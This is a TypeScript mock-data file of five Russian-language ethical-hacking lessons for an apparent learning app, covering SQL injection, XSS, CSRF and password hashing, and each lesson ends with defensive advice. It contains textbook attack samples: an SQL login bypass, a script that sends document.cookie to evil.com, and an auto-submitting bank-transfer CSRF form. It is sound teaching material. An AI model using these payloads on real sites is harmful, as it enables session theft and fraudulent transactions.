import { Lesson } from '@/types'

// Моковые данные уроков по хакингу
const mockLessons: Lesson[] = [
  {
    id: 1,
    title: 'Введение в этичный хакинг',
    description: 'Что такое этичный хакинг и почему это важно',
    category: 'hacking',
    difficulty: 'beginner',
    duration: 15,
    content: `
# Введение в этичный хакинг

Этичный хакинг — это практика взлома компьютерных систем с целью обнаружения уязвимостей до того, как их найдут злоумышленники.

## Основные принципы:
- **Разрешение** — всегда получайте письменное разрешение перед тестированием
- **Законность** — действуйте в рамках закона
- **Конфиденциальность** — не разглашайте найденные уязвимости
- **Ответственность** — сообщайте о найденных проблемах владельцам

## Типы хакеров:
- 🟢 **White Hat** — этичные хакеры, защищающие системы
- 🔴 **Black Hat** — злоумышленники
- 🟡 **Gray Hat** — действуют без разрешения, но без злого умысла
    `,
    isCompleted: false,
  },
  {
    id: 2,
    title: 'SQL-инъекции',
    description: 'Научитесь находить и предотвращать SQL-уязвимости',
    category: 'hacking',
    difficulty: 'beginner',
    duration: 30,
    content: `
# SQL-инъекции

SQL-инъекция — это атака, при которой злоумышленник может выполнить произвольный SQL-код в базе данных.

## Как это работает:

1. Злоумышленник вводит специальный код в поле ввода
2. Этот код объединяется с SQL-запросом
3. База данных выполняет изменённый запрос

## Пример уязвимости:

\`\`\`sql
-- Уязвимый код
SELECT * FROM users WHERE username = '${'${username}'}' AND password = '${'${password}'}'
\`\`\`

## Пример атаки:

Если в поле username ввести: \`admin' --\`

Запрос станет:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
\`\`\`

Часть после -- игнорируется, и злоумышленник входит как admin!

## Защита:
- Используйте параметризованные запросы
- Валидируйте все входные данные
- Применяйте принцип минимальных привилегий
    `,
    isCompleted: false,
  },
  {
    id: 3,
    title: 'XSS-атаки',
    description: 'Cross-Site Scripting — как защитить сайт от внедрения скриптов',
    category: 'hacking',
    difficulty: 'intermediate',
    duration: 25,
    content: `
# XSS-атаки (Cross-Site Scripting)

XSS — это уязвимость, позволяющая злоумышленнику внедрить вредоносный JavaScript-код на страницу.

## Типы XSS:

### 1. Reflected XSS
Вредоносный скрипт приходит в запросе и сразу выполняется

### 2. Stored XSS
Скрипт сохраняется на сервере (в комментариях, сообщениях)

### 3. DOM-based XSS
Уязвимость в клиентском JavaScript-коде

## Пример атаки:

Злоумышленник оставляет комментарий:
\`\`\`html
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
\`\`\`

## Защита:
- Экранируйте все выходные данные
- Используйте Content Security Policy (CSP)
- Валидируйте входные данные
- Используйте современные фреймворки (React, Vue)
    `,
    isCompleted: false,
  },
  {
    id: 4,
    title: 'CSRF-атаки',
    description: 'Cross-Site Request Forgery — подделка запросов',
    category: 'hacking',
    difficulty: 'intermediate',
    duration: 20,
    content: `
# CSRF-атаки (Cross-Site Request Forgery)

CSRF — это атака, при которой злоумышленник заставляет пользователя выполнить нежелательное действие на сайте, где он аутентифицирован.

## Как это работает:

1. Пользователь авторизован на сайте банка
2. Злоумышленник создаёт форму на своём сайте
3. Пользователь посещает сайт злоумышленника
4. Форма автоматически отправляет запрос в банк

## Пример:

\`\`\`html
<!-- Форма злоумышленника -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="evil-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

## Защита:
- Используйте CSRF-токены
- Проверяйте заголовок Origin/Referer
- Требуйте повторной аутентификации для важных операций
- Используйте SameSite cookie
    `,
    isCompleted: false,
  },
  {
    id: 5,
    title: 'Безопасность паролей',
    description: 'Хеширование, соль и лучшие практики',
    category: 'hacking',
    difficulty: 'beginner',
    duration: 20,
    content: `
# Безопасность паролей

## Почему пароли важны?

Пароли — первая линия защиты аккаунта.

## Плохие практики:
- ❌ Пароль: 123456
- ❌ Пароль: password
- ❌ Один пароль для всех сайтов
- ❌ Хранение паролей в открытом виде

## Хорошие практики:
- ✅ Минимум 12 символов
- ✅ Комбинация букв, цифр, символов
- ✅ Уникальный пароль для каждого сайта
- ✅ Использование менеджера паролей
- ✅ Двухфакторная аутентификация

## Хеширование:

Пароли должны храниться в захешированном виде:

\`\`\`
password → bcrypt → $2b$10$N9qo8uLOickgx2ZMRZoMye...
\`\`\`

## Алгоритмы:
- ✅ bcrypt (рекомендуется)
- ✅ Argon2 (современный)
- ✅ scrypt
- ❌ MD5 (устарел)
- ❌ SHA1 (устарел)
    `,
    isCompleted: false,
  },
]

export const getLessons = async (): Promise<Lesson[]> => {
  // В реальном приложении: await fetch('/api/hacking/lessons')
  return mockLessons
}

export const getLessonById = async (id: number): Promise<Lesson | null> => {
  const lesson = mockLessons.find(l => l.id === id)
  return lesson || null
}
